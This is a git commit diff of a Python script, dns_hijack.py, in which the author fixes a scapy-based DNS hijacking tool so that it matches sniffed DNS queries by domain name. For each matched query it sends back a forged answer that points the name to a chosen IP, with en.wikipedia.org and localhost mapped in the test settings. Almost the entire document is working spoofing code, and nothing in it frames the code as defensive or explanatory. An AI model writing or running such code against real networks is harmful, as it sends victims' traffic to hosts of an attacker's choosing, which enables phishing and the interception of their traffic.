5745687bd2a3c3f8554ac158b8436f7a2090e809
George <george.neokq@gmail.com>
2022-06-15 11:32:14 +0800

    fix: logic error in DNS hijacking

--- dns_hijack.py
+++ dns_hijack.py
@@ -1,43 +1,58 @@
 from scapy.all import *
 from scapy.layers.dns import *
-from netaddr import IPNetwork
 
 TEST_MAPPING = {
-  "10.33.1.3": "8.8.8.8"
+  "en.wikipedia.org": "172.67.149.198",
+  "localhost": "172.67.149.198"
 }
+
+def is_dns_query(packet: Packet):
+  """
+  Checks whether the provided packet is a DNS query
+  """
+  if DNS in packet and packet.qdcount:
+    return True
+
+  return False
 
 def intercept_dns(intercept_map: dict):
   """
   Intercept DNS requests, given a dict where
   {
-    <CIDR address>: <DNS answer IP>,
+    "<Domain name>": <DNS answer IP>,
     ...
   }
 
   Parameters
   -----------
   intercept_map: dict
-    Dictionary mapping of network address in CIDR notation, to an IP address to answer with.
-    If the key is a single IP address instead of a range, it can be specified without /32 prefix.
+    Dictionary mapping of domain name to an IP address to answer with
   """
-  answer_map = {}
+
   print('Mapping:')
-  for [network, answer_ip] in intercept_map.items():
-    # "Unpack" the IP addresses in the range and create a more specific mapping
-    # for every host in the range
-    print(f'{network} -> {answer_ip}')
-    for host in IPNetwork(network).iter_hosts():
-      answer_map[str(host)] = answer_ip
+  for [domain_name, answer_ip] in intercept_map.items():
+    print(f'{domain_name} -> {answer_ip}')
   
   def intercept(packet: Packet):
-    if packet.haslayer('DNS') and packet['IP'].src in answer_map:
-      origin_src = packet['IP'].src
+    if is_dns_query(packet):
+      origin_src: str = packet['IP'].src
       dns: DNS = packet['DNS']
-      requested_domain = dns.qd.qname
+      requested_domain: bytes = dns.qd.qname
+      # Use processed qname field as key for intercept_map
+      requested_domain_str: str = requested_domain.decode('utf8')[:-1]
+
+      if(requested_domain_str not in intercept_map):
+        return
+
+      print(f'Answering query for {requested_domain_str} with IP {intercept_map[requested_domain_str]}')
+
       reply_packet = (
         IP(dst=origin_src) /
         UDP(sport=53, dport=packet['UDP'].sport) /
-        DNS(qr=1, an=DNSRR(rrname=requested_domain, rdata=answer_map[origin_src]))
+        DNS(
+          qr=1,
+          an=DNSRR(rrname=requested_domain, rdata=intercept_map[requested_domain_str])
+        )
       )
       send(reply_packet)
 
